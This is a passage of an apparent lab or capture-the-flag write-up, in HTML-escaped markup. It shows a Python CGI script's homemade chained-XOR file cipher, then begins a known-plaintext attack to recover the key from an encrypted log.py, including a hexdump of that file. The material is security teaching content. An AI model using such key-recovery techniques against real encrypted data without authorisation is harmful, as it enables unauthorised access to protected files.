&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;config&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;KEY&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;config&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;arg&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;:]:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;cipher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cipher&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;arg&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;])&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;cipher&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Crypto&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ljust&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;.encrypted&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;encrypted&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="nd"&gt;@staticmethod&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="n"&gt;blocks&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;:(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)[:&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;w&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;plain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;                    &lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;KEY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;blocks&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;            &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;rstrip&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;Content-Type: text/html&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;lt;title&amp;gt;Updator - Update system&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;static/font-awesome/css/font-awesome.css&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;static/css/style.css&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;lt;div id=&amp;quot;info&amp;quot;&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;      The update managing system is still under construction but will be available soon.&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;    &amp;lt;/div&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="the-private-key"&gt;The private key&lt;/h3&gt;
&lt;p&gt;We know the algorithm use to encrypt the &lt;code&gt;log.py.encypted&lt;/code&gt; file: a XOR cipher by
bloc of 8 characters where the preceding bloc is also XOR with the current one.
We just need the key. Bruteforcing 8 characters will be too long, we need an
other method. The &lt;code&gt;log.py.encypted&lt;/code&gt; file being python code will probably start
by something like &lt;code&gt;import sys&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;First of all lets take a closer look to &lt;code&gt;log.py.encrypted&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;maggick@rootine updator&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;hexdump&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;log&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encrypted&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;00000000&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;36&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;03&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;06&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;19&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;45&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="n"&gt;e&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;_60&lt;/span&gt;&lt;span class="p"&gt;..&lt;/span&gt;&lt;span class="n"&gt;V&lt;/span&gt;&lt;span class="p"&gt;........&lt;/span&gt;&lt;span class="n"&gt;En&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
